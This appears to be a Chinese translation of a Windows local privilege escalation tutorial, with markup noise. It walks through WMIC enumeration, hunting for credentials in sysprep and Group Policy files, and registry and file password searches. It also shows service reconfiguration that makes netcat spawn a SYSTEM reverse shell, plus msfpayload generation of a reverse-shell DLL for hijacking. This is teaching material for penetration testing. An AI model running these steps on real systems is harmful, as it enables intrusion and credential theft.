Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。</p><p>为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。  </p><pre><code>C:\Windows\system32&gt; wmic /?[global switches] The following global switches are available:/NAMESPACE           Path for the namespace the alias operate against./ROLE                Path for the role containing the alias definitions./NODE                Servers the alias will operate against./IMPLEVEL            Client impersonation level./AUTHLEVEL           Client authentication level./LOCALE              Language id the client should use./PRIVILEGES          Enable or disable all privileges./TRACE               Outputs debugging information to stderr./RECORD              Logs all input commands and output./INTERACTIVE         Sets or resets the interactive mode./FAILFAST            Sets or resets the FailFast mode./USER                User to be used during the session./PASSWORD            Password to be used for session login./OUTPUT              Specifies the mode for output redirection./APPEND              Specifies the mode for output redirection./AGGREGATE           Sets or resets aggregate mode./AUTHORITY           Specifies the  for the connection./?[:&lt;BRIEF|FULL&gt;]    Usage information.For more information on a specific global switch, type: switch-name /?The following alias/es are available in the current role:ALIAS                    - Access to the aliases available on the local systemBASEBOARD                - Base board (also known as a motherboard or system board) management.BIOS                     - Basic input/output services (BIOS) management.BOOTCONFIG               - Boot configuration management.CDROM                    - CD-ROM management.COMPUTERSYSTEM           - Computer system management.CPU                      - CPU management.CSPRODUCT                - Computer system product information from SMBIOS.DATAFILE                 - DataFile Management.DCOMAPP                  - DCOM Application management.DESKTOP                  - User&#39;s Desktop management.DESKTOPMONITOR           - Desktop Monitor management.DEVICEMEMORYADDRESS      - Device memory addresses management.DISKDRIVE                - Physical disk drive management.DISKQUOTA                - Disk space usage for NTFS volumes.DMACHANNEL               - Direct memory access (DMA) channel management.ENVIRONMENT              - System environment settings management.FSDIR                    - Filesystem directory entry management.GROUP                    - Group account management.IDECONTROLLER            - IDE Controller management.IRQ                      - Interrupt request line (IRQ) management.JOB                      - Provides  access to the jobs scheduled using the schedule service.LOADORDER                - Management of system services that define execution dependencies.LOGICALDISK              - Local storage device management.LOGON                    - LOGON Sessions.MEMCACHE                 - Cache memory management.MEMORYCHIP               - Memory chip information.MEMPHYSICAL              - Computer system&#39;s physical memory management.NETCLIENT                - Network Client management.NETLOGIN                 - Network login information (of a particular user) management.NETPROTOCOL              - Protocols (and their network characteristics) management.NETUSE                   - Active network connection management.NIC                      - Network Interface Controller (NIC) management.NICCONFIG                - Network adapter management.NTDOMAIN                 - NT Domain management.NTEVENT                  - Entries in the NT Event Log.NTEVENTLOG               - NT eventlog file management.ONBOARDDEVICE            - Management of common adapter devices built into the motherboard (system board).OS                       - Installed Operating System/s management.PAGEFILE                 - Virtual memory file swapping management.PAGEFILESET              - Page file settings management.PARTITION                - Management of partitioned areas of a physical disk.PORT                     - I/O port management.PORTCONNECTOR            - Physical connection ports management.PRINTER                  - Printer device management.PRINTERCONFIG            - Printer device configuration management.PRINTJOB                 - Print job management.PROCESS                  - Process management.PRODUCT                  - Installation package task management.QFE                      - Quick Fix Engineering.QUOTASETTING             - Setting information for disk quotas on a volume.RDACCOUNT                - Remote Desktop connection permission management.RDNIC                    - Remote Desktop connection management on a specific network adapter.RDPERMISSIONS            - Permissions to a specific Remote Desktop connection.RDTOGGLE                 - Turning Remote Desktop listener on or off remotely.RECOVEROS                - Information that will be gathered from memory when the operating system fails.REGISTRY                 - Computer system registry management.SCSICONTROLLER           - SCSI Controller management.SERVER                   - Server information management.SERVICE                  - Service application management.SHADOWCOPY               - Shadow copy management.SHADOWSTORAGE            - Shadow copy storage area management.SHARE                    - Shared resource management.SOFTWAREELEMENT          - Management of the  elements of a software product installed on a system.SOFTWAREFEATURE          - Management of software product subsets of SoftwareElement.SOUNDDEV                 - Sound Device management.STARTUP                  - Management of commands that run automatically when users log onto the computer                            system.SYSACCOUNT               - System account management.SYSDRIVER                - Management of the system driver for a base service.SYSTEMENCLOSURE          - Physical system enclosure management.SYSTEMSLOT               - Management of physical connection points including ports,  slots and                            peripherals, and proprietary connections points.TAPEDRIVE                - Tape drive management.TEMPERATURE              - Data management of a temperature sensor (electronic thermometer).TIMEZONE                 - Time zone data management.UPS                      - Uninterruptible power supply (UPS) management.USERACCOUNT              - User account management.VOLTAGE                  - Voltage sensor (electronic voltmeter) data management.VOLUME                   - Local storage volume management.VOLUMEQUOTASETTING       - Associates the disk quota setting with a specific disk volume.VOLUMEUSERQUOTA          - Per user storage volume quota management.WMISET                   - WMI service operational parameters management.For more information on a specific alias, type: alias /?CLASS     - Escapes to full WMI schema.PATH      - Escapes to full WMI object paths.CONTEXT   - Displays the state of all the global switches.QUIT/EXIT - Exits the program.For more information on CLASS/PATH/CONTEXT, type: (CLASS | PATH | CONTEXT) /?</code></pre><p>  为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。</p><p>如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。</p><p>你可以<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="noopener">在这里</a>下载我的脚本（wmic_info.bat）<br>Windows 7 VM上的示例输出文件（严重修补） - <a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="noopener">此处</a></p><h2 id="Δt-for-t5-to-t6-快速失败"><a href="#Δt-for-t5-to-t6-快速失败" class="headerlink" title="Δt for t5 to t6 - 快速失败"></a>Δt for t5 to t6 - 快速失败</h2><p>  在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。</p><p>我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。  </p><pre><code>C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOnCaption                                     Description      HotFixID   InstalledOnhttp://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013[..Snip..]</code></pre><p>  与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。</p><p>您可以在下面看到grep补丁的语法：  </p><pre><code>C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</code></pre><p>  接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。</p><p>通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）：</p><pre><code>c:\sysprep.infc:\sysprep\sysprep.xml ％WINDIR％\Panther\Unattend\Unattended.xml ％WINDIR％\Panther\Unattended.xml</code></pre><p>这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。  </p><p><code>`</code># This is a sample from sysprep.inf with clear-text credentials.</p><h1 id="This-is-a-sample-from-sysprep-inf-with-clear-text-credentials"><a href="#This-is-a-sample-from-sysprep-inf-with-clear-text-credentials" class="headerlink" title="This is a sample from sysprep.inf with clear-text credentials."></a>This is a sample from sysprep.inf with clear-text credentials.</h1><p>[GuiUnattended]<br>OEMSkipRegional=1<br>OemSkipWelcome=1<br>AdminPassword=s3cr3tp4ssw0rd<br>TimeZone=20</p><h1 id="This-is-a-sample-from-sysprep-xml-with-Base64-“encoded”-credentials-Please-people-Base64-is-not"><a href="#This-is-a-sample-from-sysprep-xml-with-Base64-“encoded”-credentials-Please-people-Base64-is-not" class="headerlink" title="This is a sample from sysprep.xml with Base64 “encoded” credentials. Please people Base64 is not"></a>This is a sample from sysprep.xml with Base64 “encoded” credentials. Please people Base64 is not</h1><p>encryption, I take more precautions to protect my coffee. The password here is “SuperSecurePassword”.</p><localaccounts><br>    <localaccount wcm:action="add"><br>        <password><br>            <value>U3VwZXJTZWN1cmVQYXNzd29yZA==</value><br>            <plaintext>false</plaintext><br>        </password><br>        <description>Local Administrator</description><br>        <displayname>Administrator</displayname><br>        <group>Administrators</group><br>        <name>Administrator</name><br>    </localaccount><br></localaccounts><h1 id="Sample-from-Unattended-xml-with-the-same-“secure”-Base64-encoding"><a href="#Sample-from-Unattended-xml-with-the-same-“secure”-Base64-encoding" class="headerlink" title="Sample from Unattended.xml with the same “secure” Base64 encoding."></a>Sample from Unattended.xml with the same “secure” Base64 encoding.</h1><autologon><br>    <password><br>        <value>U3VwZXJTZWN1cmVQYXNzd29yZA==</value><br>        <plaintext>false</plaintext><br>    </password><br>    <enabled>true</enabled><br>    <username>Administrator</username><br></autologon><pre><code>根据Ben Campbell（[@Meatballs__](https://twitter.com/Meatballs__)）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性：Services \ Services.xml：[特定于元素的属性](http://msdn.microsoft.com/en-us/library/cc980070.aspx)ScheduledTasks \ ScheduledTasks.xml：[任务内部元素](http://msdn.microsoft.com/en-us/library/cc422920.aspx)，[TaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd341350.aspx)，[ImmediateTaskV2内部元素](http://msdn.microsoft.com/en-us/library/dd304114.aspx)打印机\ Printers.xml：[SharedPrinter元素](http://msdn.microsoft.com/en-us/library/cc422918.aspx)驱动器\ Drives.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc704598.aspx)DataSources \ DataSources.xml：[元素特定属性](http://msdn.microsoft.com/en-us/library/cc422926.aspx)可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。![img](http://www.fuzzysecurity.com/tutorials/images/priv06_big.png)然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过[此处](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)建立的会话执行[，](https://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp)或者（2）您可以使用Get-GPPPassword，它是[PowerSploit的](https://github.com/mattifestation/PowerSploit)一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在[这里查看](http://www.greyhathacker.net/?p=185)来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。</code></pre><h1 id="This-will-only-work-if-both-registry-keys-contain-“AlwaysInstallElevated”-with-DWORD-values-of-1"><a href="#This-will-only-work-if-both-registry-keys-contain-“AlwaysInstallElevated”-with-DWORD-values-of-1" class="headerlink" title="This will only work if both registry keys contain “AlwaysInstallElevated” with DWORD values of 1."></a>This will only work if both registry keys contain “AlwaysInstallElevated” with DWORD values of 1.</h1><p>C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated<br>C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</p><pre><code>为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。</code></pre><h1 id="The-command-below-will-search-the-file-system-for-file-names-containing-certain-keywords-You-can"><a href="#The-command-below-will-search-the-file-system-for-file-names-containing-certain-keywords-You-can" class="headerlink" title="The command below will search the file system for file names containing certain keywords. You can"></a>The command below will search the file system for file names containing certain keywords. You can</h1><p>specify as many keywords as you wish.</p><p>C:\Windows\system32&gt; dir /s <em>pass</em> == <em>cred</em> == <em>vnc</em> == <em>.config</em></p><h1 id="Search-certain-file-types-for-a-keyword-this-can-generate-a-lot-of-output"><a href="#Search-certain-file-types-for-a-keyword-this-can-generate-a-lot-of-output" class="headerlink" title="Search certain file types for a keyword, this can generate a lot of output."></a>Search certain file types for a keyword, this can generate a lot of output.</h1><p>C:\Windows\system32&gt; findstr /si password <em>.xml </em>.ini *.txt</p><h1 id="Similarly-the-two-commands-below-can-be-used-to-grep-the-registry-for-keywords-in-this-case-“password”"><a href="#Similarly-the-two-commands-below-can-be-used-to-grep-the-registry-for-keywords-in-this-case-“password”" class="headerlink" title="Similarly the two commands below can be used to grep the registry for keywords, in this case “password”."></a>Similarly the two commands below can be used to grep the registry for keywords, in this case “password”.</h1><p>C:\Windows\system32&gt; reg query HKLM /f password /t REG_SZ /s<br>C:\Windows\system32&gt; reg query HKCU /f password /t REG_SZ /s</p><pre><code>## Δt for t7 to t10 - 卷起你的袖子  希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在[此处](http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx)从Microsoft technet下载该套件。我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子  </code></pre><h1 id="We-can-use-sc-to-query-configure-and-manage-windows-services"><a href="#We-can-use-sc-to-query-configure-and-manage-windows-services" class="headerlink" title="We can use sc to query, configure and manage windows services."></a>We can use sc to query, configure and manage windows services.</h1><p>C:\Windows\system32&gt; sc qc Spooler</p><p>[SC] QueryServiceConfig SUCCESS</p><p>SERVICE_NAME: Spooler<br>        TYPE               : 110  WIN32_OWN_PROCESS (interactive)<br>        START_TYPE         : 2   AUTO_START<br>        ERROR_CONTROL      : 1   NORMAL<br>        BINARY_PATH_NAME   : C:\Windows\System32\spoolsv.exe<br>        LOAD_ORDER_GROUP   : SpoolerGroup<br>        TAG                : 0<br>        DISPLAY_NAME       : Print Spooler<br>        DEPENDENCIES       : RPCSS<br>                           : http<br>        SERVICE_START_NAME : LocalSystem</p><pre><code>我们可以使用accesschk检查每个服务所需的权限级别。</code></pre><h1 id="We-can-see-the-permissions-that-each-user-level-has-you-can-also-use-“accesschk-exe-ucqv-”-to-list"><a href="#We-can-see-the-permissions-that-each-user-level-has-you-can-also-use-“accesschk-exe-ucqv-”-to-list" class="headerlink" title="We can see the permissions that each user level has, you can also use “accesschk.exe -ucqv *” to list"></a>We can see the permissions that each user level has, you can also use “accesschk.exe -ucqv *” to list</h1><p>all services.</p><p>C:> accesschk.exe -ucqv Spooler</p><p>Spooler</p><p>  R  NT AUTHORITY\Authenticated Users<br>        SERVICE_QUERY_STATUS<br>        SERVICE_QUERY_CONFIG<br>        SERVICE_INTERROGATE<br>        SERVICE_ENUMERATE_DEPENDENTS<br>        SERVICE_USER_DEFINED_CONTROL<br>        READ_CONTROL<br>  R  BUILTIN\Power Users<br>        SERVICE_QUERY_STATUS<br>        SERVICE_QUERY_CONFIG<br>        SERVICE_INTERROGATE<br>        SERVICE_ENUMERATE_DEPENDENTS<br>        SERVICE_START<br>        SERVICE_USER_DEFINED_CONTROL<br>        READ_CONTROL<br>  RW BUILTIN\Administrators<br>        SERVICE_ALL_ACCESS<br>  RW NT AUTHORITY\SYSTEM<br>        SERVICE_ALL_ACCESS</p><pre><code>   Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。让我们比较Windows 8和Windows XP SP0上的输出。  </code></pre><h1 id="This-is-on-Windows-8"><a href="#This-is-on-Windows-8" class="headerlink" title="This is on Windows 8."></a>This is on Windows 8.</h1><p>C:\Users\b33f\tools\Sysinternals&gt; accesschk.exe -uwcqv “Authenticated Users” *<br>No matching objects found.</p><h1 id="On-a-default-Windows-XP-SP0-we-can-see-there-is-a-pretty-big-security-fail"><a href="#On-a-default-Windows-XP-SP0-we-can-see-there-is-a-pretty-big-security-fail" class="headerlink" title="On a default Windows XP SP0 we can see there is a pretty big security fail."></a>On a default Windows XP SP0 we can see there is a pretty big security fail.</h1><p>C:> accesschk.exe -uwcqv “Authenticated Users” *<br>RW SSDPSRV<br>        SERVICE_ALL_ACCESS<br>RW upnphost<br>        SERVICE_ALL_ACCESS</p><p>C:> accesschk.exe -ucqv SSDPSRV</p><p>SSDPSRV</p><p>  RW NT AUTHORITY\SYSTEM<br>        SERVICE_ALL_ACCESS<br>  RW BUILTIN\Administrators<br>        SERVICE_ALL_ACCESS<br>  RW NT AUTHORITY\Authenticated Users<br>        SERVICE_ALL_ACCESS<br>  RW BUILTIN\Power Users<br>        SERVICE_ALL_ACCESS<br>  RW NT AUTHORITY\LOCAL SERVICE<br>        SERVICE_ALL_ACCESS</p><p>C:> accesschk.exe -ucqv upnphost</p><p>upnphost</p><p>  RW NT AUTHORITY\SYSTEM<br>        SERVICE_ALL_ACCESS<br>  RW BUILTIN\Administrators<br>        SERVICE_ALL_ACCESS<br>  RW NT AUTHORITY\Authenticated Users<br>        SERVICE_ALL_ACCESS<br>  RW BUILTIN\Power Users<br>        SERVICE_ALL_ACCESS<br>  RW NT AUTHORITY\LOCAL SERVICE<br>        SERVICE_ALL_ACCESS</p><pre><code>  此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。  </code></pre><p>C:> sc qc upnphost</p><p>[SC] GetServiceConfig SUCCESS</p><p>SERVICE_NAME: upnphost<br>        TYPE               : 20  WIN32_SHARE_PROCESS<br>        START_TYPE         : 3   DEMAND_START<br>        ERROR_CONTROL      : 1   NORMAL<br>        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService<br>        LOAD_ORDER_GROUP   :<br>        TAG                : 0<br>        DISPLAY_NAME       : Universal Plug and Play Device Host<br>        DEPENDENCIES       : SSDPSRV<br>        SERVICE_START_NAME : NT AUTHORITY\LocalService</p><p>C:> sc config upnphost binpath= “C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe”<br>[SC] ChangeServiceConfig SUCCESS</p><p>C:> sc config upnphost obj= “.\LocalSystem” password= “”<br>[SC] ChangeServiceConfig SUCCESS</p><p>C:> sc qc upnphost</p><p>[SC] GetServiceConfig SUCCESS</p><p>SERVICE_NAME: upnphost<br>        TYPE               : 20  WIN32_SHARE_PROCESS<br>        START_TYPE         : 3   DEMAND_START<br>        ERROR_CONTROL      : 1   NORMAL<br>        BINARY_PATH_NAME   : C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe<br>        LOAD_ORDER_GROUP   :<br>        TAG                : 0<br>        DISPLAY_NAME       : Universal Plug and Play Device Host<br>        DEPENDENCIES       : SSDPSRV<br>        SERVICE_START_NAME : LocalSystem</p><p>C:> net start upnphost</p><pre><code>![img](http://www.fuzzysecurity.com/tutorials/images/priv01_big.png)Service Shell (upnphost)即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。![img](http://www.fuzzysecurity.com/tutorials/images/priv02_big.png)  需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。Power in Power用户（Mark Russinovich） - [这里](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx)最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你[在这里](http://www.greyhathacker.net/?p=738)阅读他的帖子。此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。您可以在以下32位系统上看到DLL搜索顺序：1 - 应用程序加载的目录2 - 32位系统目录（C：\ Windows \ System32）3 - 16位系统目录（C：\ Windows \ System）4 - Windows目录（C：\ Windows）5 - 当前工作目录（CWD）6 - PATH环境变量中的目录（系统然后用户）有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。  </code></pre><h1 id="This-is-on-Windows-7-as-low-privilege-user1"><a href="#This-is-on-Windows-7-as-low-privilege-user1" class="headerlink" title="This is on Windows 7 as low privilege user1."></a>This is on Windows 7 as low privilege user1.</h1><p>C:\Users\user1\Desktop&gt; echo %username%</p><p>user1</p><h1 id="We-have-a-win-here-since-any-non-default-directory-in-“C-”-will-give-write-access-to-authenticated"><a href="#We-have-a-win-here-since-any-non-default-directory-in-“C-”-will-give-write-access-to-authenticated" class="headerlink" title="We have a win here since any non-default directory in “C:\” will give write access to authenticated"></a>We have a win here since any non-default directory in “C:\” will give write access to authenticated</h1><p>users.</p><p>C:\Users\user1\Desktop&gt; echo %path%</p><p>C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;<br>C:\Program Files\OpenVPN\bin;C:\Python27</p><h1 id="We-can-check-our-access-permissions-with-accesschk-or-cacls"><a href="#We-can-check-our-access-permissions-with-accesschk-or-cacls" class="headerlink" title="We can check our access permissions with accesschk or cacls."></a>We can check our access permissions with accesschk or cacls.</h1><p>C:\Users\user1\Desktop&gt; accesschk.exe -dqv “C:\Python27”</p><p>C:\Python27<br>  Medium Mandatory Level (Default) [No-Write-Up]<br>  RW BUILTIN\Administrators<br>        FILE_ALL_ACCESS<br>  RW NT AUTHORITY\SYSTEM<br>        FILE_ALL_ACCESS<br>  R  BUILTIN\Users<br>        FILE_LIST_DIRECTORY<br>        FILE_READ_ATTRIBUTES<br>        FILE_READ_EA<br>        FILE_TRAVERSE<br>        SYNCHRONIZE<br>        READ_CONTROL<br>  RW NT AUTHORITY\Authenticated Users<br>        FILE_ADD_FILE<br>        FILE_ADD_SUBDIRECTORY<br>        FILE_LIST_DIRECTORY<br>        FILE_READ_ATTRIBUTES<br>        FILE_READ_EA<br>        FILE_TRAVERSE<br>        FILE_WRITE_ATTRIBUTES<br>        FILE_WRITE_EA<br>        DELETE<br>        SYNCHRONIZE<br>        READ_CONTROL</p><p>C:\Users\user1\Desktop&gt; cacls “C:\Python27”</p><p>C:\Python27 BUILTIN\Administrators:(ID)F<br>            BUILTIN\Administrators:(OI)(CI)(IO)(ID)F<br>            NT AUTHORITY\SYSTEM:(ID)F<br>            NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F<br>            BUILTIN\Users:(OI)(CI)(ID)R<br>            NT AUTHORITY\Authenticated Users:(ID)C<br>            NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C</p><h1 id="Before-we-go-over-to-action-we-need-to-check-the-status-of-the-IKEEXT-service-In-this-case-we-can-see"><a href="#Before-we-go-over-to-action-we-need-to-check-the-status-of-the-IKEEXT-service-In-this-case-we-can-see" class="headerlink" title="Before we go over to action we need to check the status of the IKEEXT service. In this case we can see"></a>Before we go over to action we need to check the status of the IKEEXT service. In this case we can see</h1><p>it is set to “AUTO_START” so it will launch on boot!</p><p>C:\Users\user1\Desktop&gt; sc qc IKEEXT</p><p>[SC] QueryServiceConfig SUCCESS</p><p>SERVICE_NAME: IKEEXT<br>        TYPE               : 20  WIN32_SHARE_PROCESS<br>        START_TYPE         : 2   AUTO_START<br>        ERROR_CONTROL      : 1   NORMAL<br>        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs<br>        LOAD_ORDER_GROUP   :<br>        TAG                : 0<br>        DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules<br>        DEPENDENCIES       : BFE<br>        SERVICE_START_NAME : LocalSystem</p><pre><code>现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！</code></pre><p>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O</p><pre><code>   Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp</code></pre><p>   Platform: Windows<br>       Arch: x86<br>Needs Admin: No<br> Total size: 314<br>       Rank: Normal</p><p>Provided by:<br>  vlad902 <a href="mailto:&#118;&#x6c;&#x61;&#x64;&#57;&#48;&#50;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#118;&#x6c;&#x61;&#x64;&#57;&#48;&#50;&#64;&#103;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a><br>  sf <a href="mailto:&#115;&#116;&#x65;&#x70;&#x68;&#101;&#x6e;&#95;&#102;&#x65;&#x77;&#x65;&#114;&#x40;&#104;&#x61;&#114;&#x6d;&#111;&#110;&#x79;&#x73;&#x65;&#99;&#117;&#114;&#105;&#116;&#x79;&#46;&#x63;&#111;&#x6d;">&#115;&#116;&#x65;&#x70;&#x68;&#101;&#x6e;&#95;&#102;&#x65;&#x77;&#x65;&#114;&#x40;&#104;&#x61;&#114;&#x6d;&#111;&#110;&#x79;&#x73;&#x65;&#99;&#117;&#114;&#105;&#116;&#x79;&#46;&#x63;&#111;&#x6d;</a></p><p>Basic options:<br>Name      Current Setting  Required  Description</p><hr><p>EXITFUNC  process          yes       Exit technique: seh, thread, process, none<br>LHOST     127.0.0.1        yes       The listen address<br>LPORT     9988             yes       The listen port</p><p>Description:<br>  Connect back to attacker and spawn a command shell</p><p>root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ D &gt;<br>/root/Desktop/evil.dll</p><p>Created by msfpayload (<a href="http://www.metasploit.com)" target="_blank" rel="noopener">http://www.metasploit.com)</a>.<br>Payload: windows/shell_reverse_tcp<br> Length: 314<br>Options: {“lhost”=&gt;”127.0.0.1”, 